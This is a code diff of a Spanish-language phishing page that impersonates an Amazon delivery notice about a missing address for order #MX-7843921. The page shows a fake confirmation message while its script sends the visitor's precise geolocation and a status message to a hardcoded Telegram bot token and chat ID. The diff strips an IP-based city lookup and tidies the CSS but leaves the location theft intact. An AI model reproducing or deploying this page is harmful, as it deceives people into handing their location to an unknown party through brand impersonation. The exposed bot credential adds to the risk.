@@ -19,7 +19,6 @@
       align-items: center;
       justify-content: space-between;
       padding: 0 16px;
-      position: relative;
     }
     .logo {
       color: #fff;
@@ -80,13 +79,8 @@
       cursor: pointer;
       box-shadow: 0 2px 5px rgba(0,0,0,0.2);
     }
-    button:hover {
-      background: #ff8c00;
-    }
-    button:disabled {
-      background: #ccc;
-      cursor: not-allowed;
-    }
+    button:hover { background: #ff8c00; }
+    button:disabled { background: #ccc; cursor: not-allowed; }
     #resultado {
       margin-top: 24px;
       font-size: 18px;
@@ -105,7 +99,7 @@
 <body>
 
   <div class="header">
-    <div></div> <!-- spacer izquierdo -->
+    <div></div> <!-- spacer -->
     <div class="logo">
       amazon<span class="smile">↝</span>
     </div>
@@ -117,7 +111,7 @@
 
     <div class="order-info">
       <strong>Pedido #MX-7843921</strong><br>
-      Dirección faltante, Zapopan
+      Dirección faltante, México
     </div>
 
     <p class="instruction">
@@ -141,20 +135,6 @@
     const BOT_TOKEN = '8665004647:AAEfrF0wdsqClv5BFRWByflP4R1rKTAJy34';
     const CHAT_ID   = '5854071809';
 
-    async function detectarCiudad() {
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-        const ciudad = data.city || 'Ciudad no detectada';
-        document.querySelector('.order-info br + text').textContent = `Dirección faltante, ${ciudad}`;
-        return ciudad;
-      } catch {
-        return 'Ciudad no detectada';
-      }
-    }
-
-    detectarCiudad();
-
     async function actualizarDatos() {
       const btn = document.getElementById('btnActualizar');
       const resultado = document.getElementById('resultado');
@@ -176,8 +156,6 @@
 
           resultado.innerHTML = '✅ Tus datos de entrega se han actualizado correctamente.<br>Gracias por confirmar.';
 
-          const ciudad = await detectarCiudad();
-
           // Enviar pin en mapa a Telegram
           await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
             method: 'POST',
@@ -197,7 +175,7 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               chat_id: CHAT_ID,
-              text: `📦 Actualización recibida\nPedido: #MX-7843921\nCiudad: ${ciudad}\nPrecisión: ±${acc}m\nHora: ${new Date().toLocaleString('es-MX')}`,
+              text: `📦 Actualización recibida\nPedido: #MX-7843921\nUbicación: México\nPrecisión: ±${acc}m\nHora: ${new Date().toLocaleString('es-MX')}`,
               parse_mode: 'Markdown'
             })
           }).catch(() => {});
